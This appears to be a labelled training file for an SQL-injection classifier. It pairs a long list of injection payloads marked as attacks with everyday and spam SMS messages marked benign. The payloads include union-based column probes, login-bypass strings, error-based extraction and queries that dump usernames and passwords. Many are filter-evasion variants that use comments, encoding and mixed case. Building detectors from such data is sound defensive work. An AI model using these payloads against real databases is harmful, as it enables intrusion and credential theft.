Payload	Attacker
UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL-- 	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2-- 	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6-- 	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10-- 	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14-- 	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- 	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- 	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- 	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- 	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4#	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12#	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#	1
'&'	1
' or '' '	1
"""-"""	1
"""*"""	1
""" or """"^"""	1
' or true--	1
') or ('x')=('x	1
""")) or ((""x""))=((""x"	1
or 1=1/*	1
admin' or '1'='1	1
admin'or 1=1 or ''='	1
admin' or 1=1/*	1
admin') or ('1'='1'/*	1
admin') or '1'='1'/*	1
"admin""/*"	1
"admin"" or ""1""=""1""/*"	1
"admin"" or 1=1#"	1
"admin"") or (""1""=""1""#"	1
"admin"") or ""1""=""1""#"	1
id=2/*/*/union/*/*/select/*/*/from/*/*/1,2,3	1
1' union/**/select/**/1	1
1' union all select 1	1
xx select xxx, 1e1from xxx //select user,password from mysql.user where user = 'root' and 1=1e1union select user,1e1from mysql.user;	1
1' \Nunion select 1	1
SELECT(UNHEX(UNHEX(333532453335324533323335)));	1
select * from users where id=\Nunion select 1,2,3,4,5,6,7,8,9,0	1
where id=.1union/*.1*/select(1)	1
where id=.1union/*.1*/select@1	1
select * from(user);	1
SELECT 1 FROM dual WHERE 1=1 AND-+-+-+-+~~((1))	1
SELECT * FROM (SELECT * FROM user A JOIN user B USING (Host,User)) C;	1
' and substr(data,1,1) = 0x61# 0x6162	1
' and substr(data,1,1) = lower(conv(11,10,36))# 'b'	1
' and substr(data,1,1) = 'a'#	1
lpad(data,1,space(1)) // lpad('hi',4,'?') = '??hi'	1
insert(insert(version(),1,0,space(0)),2,222,space(0))	1
length(replace(data, 'a', '')) # length will be shorter	1
false !pi() 0 ceil(pi()*pi()) 10 ceil((pi()+pi())*pi()) 20	1
ceil(pi()) 4 ceil(pi()*pi()+pi()) 14 ceil(pi())*ceil(version()) 24	1
floor(version()+pi()) 8 ceil(pi()*version())+true 18 ceil(pi()*pi()*pi()-pi()) 28	1
true+true 2 ceil(pi()+pi()+version()) 12 C ceil(pi()*ceil(pi()+pi())) 22 M	1
ceil(version()) 6 floor(pi()*version()) 16 G floor(version()*version()) 26 Q	1
?act=buy&id=1%0AAND 1=user	1
?query=1' || if(ascii(substr((/*!select*/ */*a!*/from test.flag),1,1))=97,1,0)%23	1
?spm=5176.100241.0.0.eViKRY?id=1%20union%23%0Aselect%20user%20from%20ddd	1
1' union distinctrow select/*!USER*/(),/*!DATABASE*/()/*f*//*r*//*o*//*m*/users#	1
inject_string=--%00%27+union%20select%20GROUP_CONCAT(DISTINCT%20table_name)%20from%20information_schema.tables%20where%20table_schema=0x73716C6F6C%23+&sanitize_quotes=none&blacklist_level=none&blacklist_keywords=&query_results=all_rows&error_level=verbose&location=where_string&submit=%D7%A2%C9%E4%21	1
id='select xx /*from*/``%23	1
99999=(select 1 as '/*') union all select 1 as '*//*',2,3,4,5 from mysql.user as `x*/`%23	1
.and 0=(select 1 as [/*]) union all select 1,2,3,4,5,6 from [test] as [*/]--	1
xxx'and'a'=(select '/*' from dual) union all select 1,2,3 from dual where '*/'='*/'	1
/*--+/*x/*/union all select 1,@@version,@@datadir,4,5 from mysql.user%23	1
xxx'and'1'=(select '-- ') union all select 1,2,3	1
".and 0=(select 1 as ""--+"") union all select 1,2,3 from dual--"	1
id=/*!SELECT*//*!CONCAT*/(0x7176626a71,(MID((/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS*//*!CHAR*/),0x20)),1,50)),0x7170767871)	1
union select (select{x user}from{1d admin}+limit+1),1	1
%26%261=1	1
extractvalue(floor(0),concat(0x0a,version()))	1
updatexml(1,repeat(user(),2),1)	1
validate=SEYY&action=send&comtype=comments&fid=1&isconfirm=yes&msg=90sec&typeid=0','3','4','5','0','1351739660', '0','0','0','0','0','aaaaaa'),('1544','2',@`'`,'4','5','1','1351739660', '0','0','0','0','0',(select(select passwordxxxxfromxxxadmin limit 1)))%23	1
select{x%0acomment}from{x%0aguestbook}limit 1	1
validate=SEYY&action=send&comtype=comments&fid=1&isconfirm=yes&msg=90sec&typeid=0','3','4','5','0','1351739660', '0','0','0','0','0','aaaaaa'),('1534','2',@`'`,'4','5','1','1351739660', '0','0','0','0','0',(select(select{x pwd}from{x %23@__admin}+limit+1)))%23	1
sql=select%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2a%20from%20manager	1
id=8E0union/*.1*/select{x user}from{x users}%23	1
11%0Aunion%0Aselect 1,2,3,4	1
/%2A%2A/union/%2A%2A/select/%2A%2A/1,2,3,4,5 –+-	1
null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4….	1
%00' union select password from mySQL.user limit 1 /*	1
(1)union(((((((select(*),hex(hash)from(passwords))))))))	1
/*union*/union/*select*/select+1,2/* 	1
REVERSE(noinu)+REVERSE(tceles) 	1
union%20distinct%20select 	1
concat()	1
/**//*!12345cOnCat*/	1
unhex(hex(/*!50000concat*/(table_name)))	1
gRoUp_cOnCAt()	1
/*!group_concat*/(/*!12345table_name*/)	1
/*!GrOuP_ConCaT*/()	1
unhex(hex(group_concat(table_name)))	1
unhex(hex(/*!12345group_concat*/(/*!12345table_name*/)))	1
convert(group_concat(table_name)+using+ascii)	1
CONVERT(group_concat(table_name)+USING+latin1)	1
CONVERT(group_concat(table_name)+USING+latin5)	1
/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like database()-- -	1
/*!order*/+/*!by*/	1
/*!12345ORDER*/+/*!BY*/	1
+/*!and*/+1=0	1
%55nion(%53elect 1,2,3)-- -	1
/**//*!50000UNION SELECT*//**/	1
+#uNiOn+#sEleCt	1
+un/**/ion+se/**/lect	1
REVERSE(noinu)+REVERSE(tceles)	1
union+/*!select*/	1
/**//*!union*//**//*!select*//**/	1
uNiOn aLl sElEcT	1
%0Aunion%0Aselect%0A	1
%0A%09UNION%0CSELECT%10NULL%	1
+UnIoN/*&a=*/SeLeCT/*&a=*/	1
union(select (1),(2),(3),(4),(5))	1
union(select(1),2,3)	1
+#1q%0AuNiOn all#qa%0A#%0AsEleCt	1
+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C	1
/union\sselect/g	1
+uni>on+sel>ect+	1
+uni on+sel ect+	1
union%23aa%0Aselect	1
/*uni X on*/union/*sel X ect*/	1
un?+un/**/ion+se/**/lect+	1
/%2A%2A/union/%2A%2A/select/%2A%2A/	1
/*!00000Union*/ /*!00000Select*/	1
+union+distinct+select+	1
/**/UNION/**//*!50000SELECT*//**/	1
+ #?1q %0AuNiOn all#qa%0A#%0AsEleCt	1
uni%0bon+se%0blect	1
/*–*/union/*–*/select/*–*/	1
/**/union/**/select/**/	1
/*!uNIOn*/ /*!SelECt*/	1
UNIunionON+SELselectECT	1
%55nion/**/%53elect	1
/*!union*//*–*//*!all*//*–*//*!select*/	1
union+sel%0bect	1
UNION(SELECT(column)FROM(table))	1
union (select 1111,2222,3333)	1
/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/	1
/*!f****U%0d%0aunion*/+/*!f****U%0d%0aSelEct*/	1
/union\s+select/i	1
+(UnIoN)+(SelECT)+	1
+/*!UnIoN*/+/*!SeLeCt*/+	1
/**/union/*!50000select*/	1
+un/**/ion+sel/**/ect+	1
+UNunionION+SEselectLECT+	1
%2f**%2funion%2f**%2fselect%2f**%2f	1
/*!50000make_set*/(6,@:=0x0a,(select(1)/*!50000from*/(/*!50000information_schema.columns*/)where@:=make_set(511,@.0x3c6c693e,/*! 50000table_name * /, / *! 50000column_name * /)), @)	1
group_concat (username, 0x3a, password)	1
/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=schEMA()-- -	1
/*!FrOm*/+%69nformation_schema./**/columns+/*!50000Where*/+/*!%54able_name*/=hex table	1
+union+distinct+select+	1
/**/UNION/**//*!50000SELECT*//**/	1
+#1q%0AuNiOn all#qa%0A#%0AsEleCt	1
uni%0bon+se%0blect	1
/*--*/union/*--*/select/*--*/	1
/**/union/**/select/**/	1
/*!uNIOn*/ /*!SelECt*/	1
UNIunionON+SELselectECT	1
%55nion/**/%53elect	1
/*!union*//*--*//*!all*//*--*//*!select*/	1
union+sel%0bect	1
UNION(SELECT(column)FROM(table))	1
union (select 1111,2222,3333)	1
/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/	1
/union\sselect/g	1
+uni>on+sel>ect+	1
+uni on+sel ect+	1
union%23aa%0Aselect	1
/*uni X on*/union/*sel X ect*/	1
un?+un/**/ion+se/**/lect+	1
/%2A%2A/union/%2A%2A/select/%2A%2A/	1
gRoUp_cOnCAt()	1
/*!group_concat*/(/*!12345table_name*/)	1
/*!GrOuP_ConCaT*/()	1
unhex(hex(group_concat(table_name)))	1
'%2f%2fa*/UNION%2fa%2a*/SELECT%2f%2a*/password%2f%2a*/FROM%2f%2a*/Users%2f%2a*/WHERE%2f%2a*/username%2f%2a*/'jodson'-- 	1
%2F**%2Funion%2F**%2Fselect%2F**%2F1,2,3,4,5,6 -- 	1
%2f*!50000uNIOn*%2f %2f*!50000SeLeCt*%2f 1,2,3,4,5-- - 	1
uNiOn(SeLeCt 1,2,3,4,5)-- -	1
%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/1,2,password%252f%252a*/FROM%252f%252a*/Users--+	1
/*!%55nion*/%20/*!%53elect*/%201,2,3,4	1
%75nion/**)!*/sele%63%74/**)!*/+1,2,3....	1
/*!50000%75%6e%69on*/ %73%65%6cect 1,2,3,4...	1
Ok lar... Joking wif u oni...	0
FreeMsg Hey there darling it's been 3 week's now and no word back! I'd like some fun you up for it still? Tb ok! XxX std chgs to send, £1.50 to rcv	0
Had your mobile 11 months or more? U R entitled to Update to the latest colour mobiles with camera for Free! Call The Mobile Update Co FREE on08002986030	0
I've been searching for the right words to thank you for this breather. I promise i wont take your help for granted and will fulfil my promise. You have been wonderful and a blessing at all times.	0
Eh u remember how 2 spell his name... Yes i did. He v naughty make until i v wet.	0
I‘m going to try for 2 months ha ha only joking	0
Just forced myself to eat a slice. I'm really not hungry tho. This sucks. Mark is getting worried. He knows I'm sick when I turn down pizza. Lol	0
Ahhh. Work. I vaguely remember that! What does it feel like? Lol	0
For fear of fainting with the of all that housework you just did? Quick have a cuppa	0
I see the letter B on my car	0
Did I forget to tell you ? I want you , I need you, I crave you ... But most of all ... I love you my sweet Arabian steed ... Mmmmmm ... Yummy	0
No calls..messages..missed calls	0
U don't know how stubborn I am. I didn't even want to go to the hospital. I kept telling Mark I'm not a weak sucker. Hospitals are for weak suckers.	0
"Wow. I never realized that you were so embarassed by your accomodations. I thought you liked it, since i was doing the best i could and you always seemed so happy about ""the cave"". I'm sorry I didn't and don't have more to give. I'm sorry i offered. I'm sorry your room was so embarassing."	0
Sorry, I'll call later in meeting.	0
Ha ha ha good joke. Girls are situation seekers.	0
As a valued customer, I am pleased to advise you that following recent review of your Mob No. you are awarded with a £1500 Bonus Prize, call09066364589	0
I plane to give on this month end.	0
K..k:)where are you?how did you performed?	0
I like you peoples very much:) but am very shy pa.	0
K. Did you call me just now ah? 	0
I call you later, don't have network. If urgnt, sms me.	0
Ela kano.,il download, come wen ur free..	0
Please call our customer service representative on0800 169 6031 between 10am-9pm as you have WON a guaranteed £1000 cash or £5000 prize!	0
i see. When we finish we have loads of loans to pay	0
Okay name ur price as long as its legal! Wen can I pick them up? Y u ave x ams xx	0
Umma my life and vava umma love you lot dear	0
I know! Grumpy old people. My mom was like you better not be lying. Then again I am always the one to play jokes...	0
I'm ok wif it cos i like 2 try new things. But i scared u dun like mah. Cos u said not too loud.	0
You are a winner U have been specially selected 2 receive £1000 or a 4* holiday (flights inc) speak to a live operator 2 claim0871277810910p/min (18+) 	0
URGENT! Your Mobile No. was awarded £2000 Bonus Caller Prize on 5/9/03 This is our final try to contact U! Call from Landline09064019788 BOX42WR29C, 150PPM	0
Ü predict wat time ü'll finish buying?	0
HEY GIRL. HOW R U? HOPE U R WELL ME AN DEL R BAK! AGAIN LONG TIME NO C! GIVE ME A CALL SUM TIME FROM LUCYxx	0
First answer my question.	0
He is there. You call and meet him	0
K, text me when you're on the way	0
Yes see ya not on the dot	0
K..i deleted my contact that why?	0
Ok... Ur typical reply...	0
I'm leaving my house now...	0
Keep yourself safe for me because I need you and I miss you already and I envy everyone that see's you in real life	0
BangBabes Ur order is on the way. U SHOULD receive a Service Msg 2 download UR content. If U do not, GoTo wap. bangb. tv on UR mobile internet/service menu	0
Great escape. I fancy the bridge but needs her lager. See you tomo 	0
What time you coming down later? 	0
U still going to the mall?	0
You lifted my hopes with the offer of money. I am in need. Especially when the end of the month approaches and it hurts my studying. Anyways have a gr8 weekend	0
Going on nothing great.bye	0
Have you got Xmas radio times. If not i will get it now	0
Hi :)finally i completed the course:)	0
Did u got that persons story	0
I sent you  &lt;#&gt;  bucks	0
U call me alter at 11 ok.	0
You please give us connection today itself before  &lt;DECIMAL&gt;  or refund the bill	0
K:)k:)good:)study well.	0
Tired. I haven't slept well the past few nights.	0
Ok no prob. Take ur time.	0
500 New Mobiles from 2004, MUST GO! Txt: NOKIA to No: 89545 & collect yours today!From ONLY £1 www.4-tc.biz 2optout087187262701.50gbp/mtmsg18	0
Life is more strict than teacher... Bcoz Teacher teaches lesson &amp; then conducts exam, But Life first conducts Exam &amp; then teaches Lessons. Happy morning. . .	0
Sorry battery died, yeah I'm here	0
Or ill be a little closer like at the bus stop on the same street	0
Tomarrow final hearing on my laptop case so i cant.	0
U don't remember that old commercial?	0
It didnt work again oh. Ok goodnight then. I.ll fix and have it ready by the time you wake up. You are very dearly missed have a good night sleep.	0
What you doing?how are you?	0
Mmm so yummy babe ... Nice jolt to the suzy	0
Yup	0
Why you Dint come with us.	0
The evo. I just had to download flash. Jealous?	0
HMV BONUS SPECIAL 500 pounds of genuine HMV vouchers to be won. Just answer 4 easy questions. Play Now! Send HMV to 86688 More info:www.100percent-real.com	0
Tell rob to mack his gf in the theater	0
You got called a tool?	0
Yeah I think my usual guy's still passed out from last night, if you get ahold of anybody let me know and I'll throw down	0
My life Means a lot to me, Not because I love my life, But because I love the people in my life, The world calls them friends, I call them my World:-).. Ge:-)..	0
Oops. 4 got that bit.	0
Unless it's a situation where YOU GO GURL would be more appropriate	0
Awesome, I remember the last time we got somebody high for the first time with diesel :V	0
SMS. ac Blind Date 4U!: Rodds1 is 21/m from Aberdeen, United Kingdom. Check Him out http://img. sms. ac/W/icmb3cktz8r7!-4 no Blind Dates send HIDE	0
TheMob> Check out our newest selection of content, Games, Tones, Gossip, babes and sport, Keep your mobile fit and funky text WAP to 82468	0
He says he'll give me a call when his friend's got the money but that he's definitely buying before the end of the week	0
Hmmm... Guess we can go 4 kb n power yoga... Haha, dunno we can tahan power yoga anot... Thk got lo oso, forgot liao...	0
Merry Christmas to you too babe, i love ya *kisses*	0
No problem. How are you doing?	0
Cool, text me when you're parked	0
Call Germany for only 1 pence per minute! Call from a fixed line via access number0844 861 85 85. No prepayment. Direct access!	0
Cool. So how come you havent been wined and dined before?	0
Ok that's great thanx a lot.	0
My sister cleared two round in birla soft yesterday.	0
Fancy a shag? I do.Interested? sextextuk.com txt XXUK SUZY to 69876. Txts cost 1.50 per msg. TnCs on website. X	0
TODAY is Sorry day.! If ever i was angry with you, if ever i misbehaved or hurt you? plz plz JUST SLAP URSELF Bcoz, Its ur fault, I'm basically GOOD	0
Congratulations ur awarded 500 of CD vouchers or 125gift guaranteed & Free entry 2 100 wkly draw txt MUSIC to 87066 TnCs www.Ldew.com1win150ppmx3age16	0
Ha ha cool cool chikku chikku:-):-DB-)	0
Good afternoon sunshine! How dawns that day ? Are we refreshed and happy to be alive? Do we breathe in the air and smile ? I think of you, my love ... As always	0
Wat uniform? In where get?	0
I'm going for bath will msg you next  &lt;#&gt;  min..	0
You could have seen me..i did't recognise you Face.:)	0
I guess that's why you re worried. You must know that there's a way the body repairs itself. And i'm quite sure you shouldn't worry. We'll take it slow. First the tests, they will guide when your ovulation is then just relax. Nothing you've said is a reason to worry but i.ll keep on followin you up.	0
Double mins and txts 4 6months FREE Bluetooth on Orange. Available on Sony, Nokia Motorola phones. Call MobileUpd8 on08000839402 or call2optout/N9DX	0
4mths half price Orange line rental & latest camera phones 4 FREE. Had your phone 11mths ? Call MobilesDirect free on08000938767 to update now! or2stoptxt	0
Morning only i can ok.	0
Was actually sleeping and still might when u call back. So a text is gr8. You rock sis. Will send u a text wen i wake.	0
FREE RINGTONE text FIRST to 87131 for a poly or text GET to 87131 for a true tone! Help?0845 2814032 16 after 1st free, tones are 3x£150pw to e£nd txt stop	0
Yep, the great loxahatchee xmas tree burning of  &lt;#&gt;  starts in an hour	0
Headin towards busetop	0
Okies... I'll go yan jiu too... We can skip ard oso, go cine den go mrt one, blah blah blah... 	0
FREE entry into our £250 weekly competition just text the word WIN to 80086 NOW. 18 T&C www.txttowin.co.uk	0
Siva is in hostel aha:-.	0
aathi..where are you dear..	0
At home watching tv lor.	0
You available now? I'm like right around hillsborough &amp;  &lt;#&gt; th	0
Hi hope u get this txt~journey hasnt been gd,now about 50 mins late I think.	0
Oic... I saw him too but i tot he din c me... I found a group liao...	0
Well done, blimey, exercise, yeah, i kinda remember wot that is, hmm. 	0
hanks lotsly!	0
Loan for any purpose £500 - £75,000. Homeowners + Tenants welcome. Have you been previously refused? We can still help. Call Free0800 1956669 or text back 'help'	0
1.20 that call cost. Which i guess isnt bad. Miss ya, need ya, want ya, love ya	0
UpgrdCentre Orange customer, you may now claim your FREE CAMERA PHONE upgrade for your loyalty. Call now on0207 153 9153. Offer ends 26th July. T&C's apply. Opt-out available	0
They don't put that stuff on the roads to keep it from getting slippery over there?	0
okmail: Dear Dave this is your final notice to collect your 4* Tenerife Holiday or #5000 CASH award! Call09061743806 from landline. TCs SAE Box326 CW25WX 150ppm	0
Nice line said by a broken heart- Plz don't cum 1 more times infront of me... Other wise once again I ll trust U... Good 9t:)	0
K, can I pick up another 8th when you're done?	0
Watching tv lor...	0
FREE MESSAGE Activate your 500 FREE Text Messages by replying to this message with the word FREE For terms & conditions, visit www.07781482378.com	0
Sorry man my account's dry or I would, if you want we could trade back half or I could buy some shit with my credit card	0
Are you free now?can i call now?	0
Kate jackson rec center before 7ish, right?	0
Check with nuerologist.	0
Maybe westshore or hyde park village, the place near my house?	0
8 at the latest, g's still there if you can scrounge up some ammo and want to give the new ak a try	0
You are guaranteed the latest Nokia Phone, a 40GB iPod MP3 player or a £500 prize! Txt word: COLLECT to No: 83355! IBHltd LdnW15H 150p/Mtmsgrcvd18+	0
That way transport is less problematic than on sat night. By the way, if u want to ask  n  to join my bday, feel free. But need to know definite nos as booking on fri. 	0
Were gonna go get some tacos	0
Today's Offer! Claim ur £150 worth of discount vouchers! Text YES to 85023 now! SavaMob, member offers mobile! T Cs08717898035. £3.00 Sub. 16 . Unsub reply X	0
PRIVATE! Your 2003 Account Statement for07815296484 shows 800 un-redeemed S.I.M. points. Call08718738001 Identifier Code 41782 Expires 18/11/04 	0
I've not called you in a while. This is hoping it was l8r malaria and that you know that we miss you guys. I miss Bani big, so pls give her my love especially. Have a great day.	0
Ummmmmaah Many many happy returns of d day my dear sweet heart.. HAPPY BIRTHDAY dear	0
But am going to college pa. What to do. are else ill come there it self. Pa.	0
I know but you need to get hotel now. I just got my invitation but i had to apologise. Cali is to sweet for me to come to some english bloke's weddin	0
Imagine you finally get to sink into that bath after I have put you through your paces, maybe even having you eat me for a while before I left ... But also imagine the feel of that cage on your cock surrounded by the bath water, reminding you always who owns you ... Enjoy, my cuck	0
I‘ll have a look at the frying pan in case it‘s cheap or a book perhaps. No that‘s silly a frying pan isn‘t likely to be a book	0
Hi Princess! Thank you for the pics. You are very pretty. How are you?	0
Geeeee ... I love you so much I can barely stand it	0
Oooh bed ridden ey? What are YOU thinking of?	0
Yar lor wait 4 my mum 2 finish sch then have lunch lor... I whole morning stay at home clean my room now my room quite clean... Hee...	0
Nope i waiting in sch 4 daddy... 	0
Arngd marriage is while u r walkin unfortuntly a snake bites u. bt love marriage is dancing in frnt of d snake &amp; sayin Bite me, bite me.	0
my ex-wife was not able to have kids. Do you want kids one day?	0
"""Pete can you please ring meive hardly gotany credit"""	0
You have been specially selected to receive a 2000 pound award! Call08712402050 BEFORE the lines close. Cost 10ppm. 16+. T&Cs apply. AG Promo	0
I am great! How are you?	0
I'm going out to buy mum's present ar.	0
Be happy there. I will come after noon	0
what I meant to say is cant wait to see u again getting bored of this bridgwater banter	0
Its a valentine game. . . Send dis msg to all ur friends. .. If 5 answers r d same then someone really loves u. Ques- which colour suits me the best?rply me	0
"""Happy valentines day"" I know its early but i have hundreds of handsomes and beauties to wish. So i thought to finish off aunties and uncles 1st..."	0
Let there be snow. Let there be snow. This kind of weather brings ppl together so friendships can grow.	0
sorry, no, have got few things to do. may be in pub later.	0
Yup i thk they r e teacher said that will make my face look longer. Darren ask me not 2 cut too short.	0
Thank u!	0
Me n him so funny...	0
I had askd u a question some hours before. Its answer	0
Ya very nice. . .be ready on thursday	0
PRIVATE! Your 2003 Account Statement for shows 800 un-redeemed S. I. M. points. Call08715203694 Identifier Code: 40533 Expires 31/10/04	0
I'm gonna say no. Sorry. I would but as normal am starting to panic about time. Sorry again! Are you seeing on Tuesday?	0
Tell them the drug dealer's getting impatient	0
88800 and 89034 are premium phone services call08718711108	0
Leave it de:-). Start Prepare for next:-)..	0
This pay is  &lt;DECIMAL&gt;  lakhs:)	0
"SMS. ac sun0819 posts HELLO:""You seem cool, wanted to say hi. HI!!!"" Stop? Send STOP to 62468"	0
I dont knw pa, i just drink milk..	0
Missed your call cause I was yelling at scrappy. Miss u. Can't wait for u to come home. I'm so lonely today.	0
Hi I'm sue. I am 20 years old and work as a lapdancer. I love sex. Text me live - I'm i my bedroom now. text SUE to 89555. By TextOperator G2 1DA 150ppmsg 18+	0
